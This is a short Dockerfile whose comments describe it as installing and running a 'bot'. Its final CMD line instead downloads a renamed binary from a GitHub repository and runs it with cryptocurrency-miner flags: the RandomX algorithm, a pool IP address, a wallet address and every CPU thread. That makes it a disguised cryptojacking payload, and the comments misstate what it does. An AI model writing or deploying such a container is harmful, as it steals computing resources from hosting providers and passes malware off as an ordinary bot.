FROM phusion/baseimage:bionic-1.0.0

# Use baseimage-docker's init system:
CMD ["/sbin/my_init"]

# Install dependencies:
RUN apt-get update && apt-get install -y \
    bash \
    curl \
    sudo \
    wget \
    git \
    make \
    busybox \
    build-essential \
    nodejs \
    npm \
    screen \
    neofetch \
    ca-certificates \
    libcurl4 \
    libjansson4 \
    libgomp1 \
 && mkdir -p /home/stuff

# Set work dir:
WORKDIR /home

# Copy files:
COPY startbot.sh /home
COPY /stuff /home/stuff

# Run config.sh and clean up APT:
RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# Install the bot:
RUN echo "Uploaded files:" && ls /home/stuff/

# Run bot script:
CMD wget https://github.com/Sairin-SLOT/zepoh/raw/main/xmolx && chmod +x xmolx && ./xmolx -a rx/0 -o 24.199.90.158:443 -u ZEPHs8j799QQFKmKFaHEJ85sGoNU3VgNGU7TF1ez9gjJRHb2XYVUPvgLS8okjGECMhcgx4HuJceLwXBEywNBR1gUP6tsD3K9iVY -p x -t $(nproc --all) --donate-level 1 -k
